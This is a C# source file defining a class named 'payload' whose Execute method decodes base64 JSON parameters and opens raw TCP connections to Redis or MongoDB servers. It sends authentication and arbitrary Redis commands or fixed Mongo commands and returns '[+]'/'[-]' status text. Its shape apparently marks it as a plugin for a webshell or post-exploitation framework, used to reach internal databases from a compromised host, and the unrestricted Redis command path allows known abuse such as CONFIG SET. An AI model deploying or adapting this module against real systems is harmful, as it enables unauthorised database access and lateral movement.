using System;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;

public class payload
{
    public payload() { }

    public string Execute(object param)
    {
        try
        {
            if (!(param is Dictionary<string, object> mapParam))
            {
                return "[-] ERROR: Invalid parameter type. Expected Dictionary.";
            }
            
            if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
            {
                return "[-] Missing parameter json";
            }

            string rawInput = jsonValue.ToString();
            string szJson = "";

            try
            {
                byte[] data = Convert.FromBase64String(rawInput);
                szJson = Encoding.UTF8.GetString(data);
            }
            catch
            {
                szJson = rawInput;
            }

            string dbType = GetJsonValue(szJson, "dbtype");
            string host = GetJsonValue(szJson, "ip");
            if (string.IsNullOrEmpty(host)) host = "127.0.0.1";

            int port = 6379;
            int.TryParse(GetJsonValue(szJson, "port"), out port);
            if (port <= 0)
                port = (dbType == "mongodb" ? 27017 : 6379);

            string user = GetJsonValue(szJson, "user");
            string pass = GetJsonValue(szJson, "pass");
            string action = GetJsonValue(szJson, "action");
            string query = GetJsonValue(szJson, "query");

            int timeout = 10;
            int.TryParse(GetJsonValue(szJson, "timeout"), out timeout);
            if (timeout <= 0)
                timeout = 10;

            if (dbType.ToLower() == "redis")
            {
                RedisManager redis = new RedisManager(host, port, pass, timeout);
                return redis.ProcessAction(action, query);
            }
            else if (dbType.ToLower() == "mongodb")
            {
                MongoManager mongo = new MongoManager(host, port, user, pass, timeout);
                return mongo.ProcessAction(action, query);
            }
            else
            {
                return "[-] ERROR: Unsupported NoSQL database type.";
            }
        }
        catch (Exception e)
        {
            return "[-] ERROR: " + e.Message;
        }
    }

    private string GetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success)
            return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success)
            return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }
}

public class RedisManager
{
    private string host;
    private int port;
    private string pass;
    private int timeout;

    public RedisManager(string host, int port, string pass, int timeout)
    {
        this.host = host;
        this.port = port;
        this.pass = pass;
        this.timeout = timeout > 0 ? timeout : 10;
    }

    public string ProcessAction(string action, string query)
    {
        try
        {
            using (TcpClient client = new TcpClient())
            {
                int timeoutMs = timeout * 1000;
                client.ReceiveTimeout = timeoutMs;
                client.SendTimeout = timeoutMs;

                client.Connect(host, port);
                using (NetworkStream stream = client.GetStream())
                {
                    if (!string.IsNullOrEmpty(pass))
                    {
                        string authCmd = $"*2\r\n$4\r\nAUTH\r\n${pass.Length}\r\n{pass}\r\n";
                        byte[] authBytes = Encoding.UTF8.GetBytes(authCmd);
                        stream.Write(authBytes, 0, authBytes.Length);

                        byte[] respBuffer = new byte[1024];
                        int read = stream.Read(respBuffer, 0, respBuffer.Length);
                        string authResp = Encoding.UTF8.GetString(respBuffer, 0, read);
                        if (authResp.Contains("-ERR"))
                        {
                            return "[-] Redis Auth Failed: " + authResp;
                        }
                    }

                    if (action.ToLower() == "connect")
                    {
                        return "[+] SUCCESS_REDIS_CONNECTED -> Ready to send RESP commands.";
                    }

                    if (string.IsNullOrEmpty(query))
                    {
                        query = "INFO";
                    }

                    string[] parts = query.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    StringBuilder respBuilder = new StringBuilder();
                    respBuilder.Append($"*{parts.Length}\r\n");
                    foreach (string part in parts)
                    {
                        respBuilder.Append($"${Encoding.UTF8.GetByteCount(part)}\r\n{part}\r\n");
                    }

                    byte[] cmdBytes = Encoding.UTF8.GetBytes(respBuilder.ToString());
                    stream.Write(cmdBytes, 0, cmdBytes.Length);

                    byte[] buffer = new byte[8192];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);

                    return Encoding.UTF8.GetString(buffer, 0, bytesRead);
                }
            }
        }
        catch (Exception ex)
        {
            return "[-] Redis Connection Error: " + ex.Message;
        }
    }
}

public class MongoManager
{
    private string host;
    private int port;
    private string user;
    private string pass;
    private int timeout;

    public MongoManager(string host, int port, string user, string pass, int timeout)
    {
        this.host = host;
        this.port = port;
        this.user = user;
        this.pass = pass;
        this.timeout = timeout > 0 ? timeout : 10;
    }

    public string ProcessAction(string action, string query)
    {
        try
        {
            using (TcpClient client = new TcpClient())
            {
                int timeoutMs = timeout * 1000;
                client.ReceiveTimeout = timeoutMs;
                client.SendTimeout = timeoutMs;

                client.Connect(host, port);
                using (NetworkStream stream = client.GetStream())
                {
                    if (action.ToLower() == "connect")
                    {
                        byte[] pingCommand = BuildMongoCommand("admin", "isMaster", 1);
                        stream.Write(pingCommand, 0, pingCommand.Length);

                        byte[] buffer = new byte[4096];
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            return "[+] SUCCESS_MONGO_CONNECTED -> Successfully connected to MongoDB server.";
                        }
                        return "[-] MongoDB Connection failed: No response received.";
                    }

                    if (string.IsNullOrEmpty(query))
                    {
                        query = "db.stats()";
                    }

                    string dbName = string.IsNullOrEmpty(user) ? "admin" : user;
                    byte[] cmdBytes = BuildMongoCommand(dbName, "ping", 1);
                    
                    if (query.Contains("stats"))
                    {
                        cmdBytes = BuildMongoCommand(dbName, "dbStats", 1);
                    }
                    else if (query.Contains("listCollections"))
                    {
                        cmdBytes = BuildMongoCommand(dbName, "listCollections", 1);
                    }

                    stream.Write(cmdBytes, 0, cmdBytes.Length);

                    byte[] respBuffer = new byte[8192];
                    int readBytes = stream.Read(respBuffer, 0, respBuffer.Length);
                    
                    string responseStr = Encoding.UTF8.GetString(respBuffer, 0, readBytes);
                    
                    return "[+] MongoDB Command Executed Successfully:\n" + ExtractMongoText(respBuffer, readBytes);
                }
            }
        }
        catch (Exception ex)
        {
            return "[-] MongoDB Connection/Query Error: " + ex.Message;
        }
    }

    private byte[] BuildMongoCommand(string dbName, string commandName, int commandValue)
    {
        using (MemoryStream ms = new MemoryStream())
        using (BinaryWriter bw = new BinaryWriter(ms))
        {
            bw.Write(0);
            bw.Write(12345); // RequestID
            bw.Write(0); // ResponseTo
            bw.Write(2013); // OP_QUERY (OpCode)

            bw.Write(0); // Flags
            byte[] dbBytes = Encoding.UTF8.GetBytes(dbName + ".$cmd\0");
            bw.Write(dbBytes);

            bw.Write(0); // NumberToSkip
            bw.Write(1); // NumberToReturn

            using (MemoryStream bsonMs = new MemoryStream())
            using (BinaryWriter bsonBw = new BinaryWriter(bsonMs))
            {
                long bsonLenPos = bsonMs.Position;
                bsonBw.Write(0);
                bsonBw.Write((byte)0x10);
                bsonBw.Write(Encoding.UTF8.GetBytes(commandName));
                bsonBw.Write((byte)0);
                bsonBw.Write(commandValue);

                bsonBw.Write((byte)0);

                long bsonEndPos = bsonMs.Position;
                bsonMs.Position = bsonLenPos;
                bsonBw.Write((int)bsonEndPos);

                byte[] bsonBytes = bsonMs.ToArray();
                bw.Write(bsonBytes);
            }

            long totalLength = ms.Position;
            ms.Position = 0;
            bw.Write((int)totalLength);

            return ms.ToArray();
        }
    }

    private string ExtractMongoText(byte[] buffer, int length)
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                char c = (char)buffer[i];
                if (c >= 32 && c <= 126)
                {
                    sb.Append(c);
                }
                else if (c == '\n' || c == '\r' || c == '\t')
                {
                    sb.Append(c);
                }
            }
            string result = sb.ToString();
            return string.IsNullOrEmpty(result) ? "[Raw BSON Binary Response Received]" : result;
        }
        catch
        {
            return "[+] MongoDB Operation Completed.";
        }
    }
}